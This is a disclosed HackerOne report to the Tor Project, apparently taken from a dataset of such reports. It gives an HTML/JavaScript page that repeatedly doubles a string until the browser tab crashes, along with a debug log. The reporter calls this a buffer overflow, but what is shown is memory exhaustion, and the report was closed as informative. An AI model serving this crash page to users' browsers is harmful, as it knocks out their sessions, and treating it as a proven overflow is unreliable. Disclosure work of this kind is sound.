---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '281682'
original_report_id: '281682'
title: Crashes/Buffer at 0x2C0086,name=PBrowser::Msg_Destroy
weakness: Classic Buffer Overflow
team_handle: torproject
created_at: '2017-10-22T09:24:25.700Z'
disclosed_at: '2017-10-24T09:42:01.243Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 0
tags:
- hackerone
- classic-buffer-overflow
---

# Crashes/Buffer at 0x2C0086,name=PBrowser::Msg_Destroy

## Metadata

- HackerOne Report ID: 281682
- Weakness: Classic Buffer Overflow
- Program: torproject
- Disclosed At: 2017-10-24T09:42:01.243Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Hi Team, 

Steps to Reproduce: 
1. Open Tor 
2. Navigate to string.html
Where string.html :
```
<script>
function tor()
 {
  
    var uristring = unescape("%u4141%u4141");
      
    for(i=0; i <= 50 ; ++i) 
 {
        uristring+=uristring;
        document.write(uristring);
    }    
    document.write(uristring);
}
</script>
</head>
<body onload="tor()">
</body>
```
3. 'Gah! This tab has crashed.

However, running it to debug mode generates the below exception :

```
###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0086,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv

[Parent 23125] WARNING: waitpid failed pid:23182 errno:10: file /home/debian/build/tor-browser/ipc/chromium/src/base/process_util_posix.cc, line 268
Unable to update the static FcBlanks: 0x0600
Unable to update the static FcBlanks: 0x0601
Unable to update the static FcBlanks: 0x0602
Unable to update the static FcBlanks: 0x0603
Unable to update the static FcBlanks: 0x06dd
Unable to update the static FcBlanks: 0x070f
Unable to update the static FcBlanks: 0x2028
Unable to update the static FcBlanks: 0x2029
Unable to update the static FcBlanks: 0xfff9
Unable to update the static FcBlanks: 0xfffa
Unable to update the static FcBlanks: 0xfffb
[Parent 23125] WARNING: pipe error (58): Connection reset by peer: file /home/debian/build/tor-browser/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 322
[Parent 23125] WARNING: pipe error (54): Connection reset by peer: file /home/debian/build/tor-browser/ipc/chromium/src/chrome/common/ipc_channel_posix.cc, line 322

###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0086,name=PBrowser::Msg_Destroy) Channel error: cannot send/recv

[Parent 23125] WARNING: waitpid failed pid:23224 errno:10: file /home/debian/build/tor-browser/ipc/chromium/src/base/process_util_posix.cc, line 268 
```

WFM in Debain attaching string.html and PoC for reference, request you to please have a look.





Regards
Dhiraj

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
